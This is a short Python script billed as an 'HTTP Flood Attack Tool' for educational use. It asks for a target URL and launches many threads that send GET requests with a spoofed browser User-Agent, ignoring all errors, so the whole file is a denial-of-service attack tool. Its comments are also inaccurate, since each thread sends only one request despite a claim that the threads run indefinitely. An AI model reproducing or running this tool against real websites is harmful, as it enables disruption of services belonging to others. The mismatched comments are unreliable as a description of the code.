import requests
import threading
import time
from urllib.parse import urlparse

# Global variables
target_url = ""
num_threads = 100
delay = 0.01
attack_running = True

def send_request():
    """Send a single HTTP GET request to the target."""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        response = requests.get(target_url, headers=headers, timeout=5)
        # Optional: Print status
        # print(f"Status: {response.status_code} | URL: {target_url}")
    except:
        pass  # Ignore errors (e.g., connection issues)

def start_attack():
    """Start the flood attack with multiple threads."""
    print(f"Starting HTTP flood on: {target_url}")
    print(f"Threads: {num_threads} | Delay: {delay}s")
    print("Press Ctrl+C to stop the attack.\n")

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)
        time.sleep(delay)

    # Wait for all threads to complete (they run indefinitely)
    for thread in threads:
        thread.join()

def main():
    global target_url, num_threads, delay, attack_running

    # Interactive input
    print("🚀 HTTP Flood Attack Tool (Educational Use Only)")
    print("⚠️  Only use on websites you own or have explicit permission to test.")
    print("-" * 50)

    # Get URL
    target_url = input("Enter the target URL (e.g., https://example.com): ").strip()
    if not target_url.startswith("http"):
        print("❌ Invalid URL. Must start with http:// or https://")
        return

    # Get number of threads
    try:
        num_threads = int(input("Enter number of concurrent threads (default: 100): ") or "100")
    except ValueError:
        num_threads = 100

    # Get delay
    try:
        delay = float(input("Enter delay between requests (default: 0.01): ") or "0.01")
    except ValueError:
        delay = 0.01

    # Start attack
    try:
        start_attack()
    except KeyboardInterrupt:
        print("\n\n🛑 Attack stopped by user.")
        attack_running = False

if __name__ == "__main__":
    main()   
